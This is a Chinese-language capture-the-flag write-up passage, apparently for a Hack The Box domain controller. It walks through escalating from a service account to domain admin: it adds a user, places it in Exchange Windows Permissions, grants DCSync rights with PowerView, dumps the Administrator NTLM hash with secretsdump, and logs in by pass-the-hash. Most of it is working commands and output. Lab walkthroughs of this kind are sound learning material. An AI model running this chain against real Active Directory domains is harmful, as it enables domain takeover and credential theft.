接下来我们需要进行提权，考虑到这是一台域控服务器，且我们已经获取到一个账户密码，我们优先使用bloodhound-python获取信息

根据bloodhound分析结果， svc-alfresco 是 Service Accounts 组的成员，该组是 Privileged IT Accounts 组的成员，该组是 Account Operators 的成员。此外，Account Operators 组对 Exchange Windows 权限组具有 GenericAll 权限，该组对域具有 WriteDacl 权限



Account Operators可以创建组成员

GenericAll 权限意味着可以控制组的权限

WriteDacl 权限滥用此权限来授予自己 DcSync 权限，这将赋予我们执行域复制和转储域中的所有密码哈希值的权限

第一步创建用户

```
net user zh qwer!123 /add /domain
```

![image-20241020181923454](https://s2.loli.net/2024/10/20/GKnrzyiOAtL9d42.png)

第二步：将用户zh加入到Exchange Windows Permissions

```
net group "Exchange Windows Permissions" zh /add
```

第三步：向新建用户添加DCsync权限，使用powerview来实现

```
Import-Module .\PowerView.ps1
$SecPass = ConvertTo-SecureString 'qwer!123' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\zh', $SecPass)
Add-ObjectACL -PrincipalIdentity zh -Credential $Cred -Rights DCSync
```

到这步结束，zh用户已经获取了DCsync的权限

第四步：dump admistrator的hash值

```
impacket-secretsdump htb.local/zh@10.129.95.210 -just-dc-user Administrator -just-dc-ntlm
impacket-secretsdump 'zh:qwer!123@10.10.10.161'
```

htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::

使用impacket-psexec进行登录

```
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161 cmd.exe
```
